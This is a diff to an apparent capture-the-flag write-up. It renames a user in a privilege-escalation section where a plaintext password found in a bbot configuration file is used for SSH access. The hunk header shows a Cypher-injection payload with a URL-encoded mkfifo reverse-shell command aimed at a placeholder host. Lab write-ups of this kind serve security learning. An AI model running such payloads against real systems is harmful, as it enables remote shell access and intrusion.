@@ -63,12 +63,12 @@ CALL custom.getUrlStatusCode("http://<ip>:<port>/?c=$(rm%20%2Ftmp%2Ff%3Bmkfifo%2
 
 # PrivEsc
 
-## Step 1: List /home/graham
+## Step 1: List /home/graphasm
 
 ![listhome](img/listhome.png)
 
-After listing grahams home files we find bbot configuration file which contains password in plain text. We can now use those credentials to connect to SSH as graham.
+After listing graphasms home files we find bbot configuration file which contains password in plain text. We can now use those credentials to connect to SSH as graphasm.
 
-## Step 2: SSH as graham
+## Step 2: SSH as graphasm
 
 
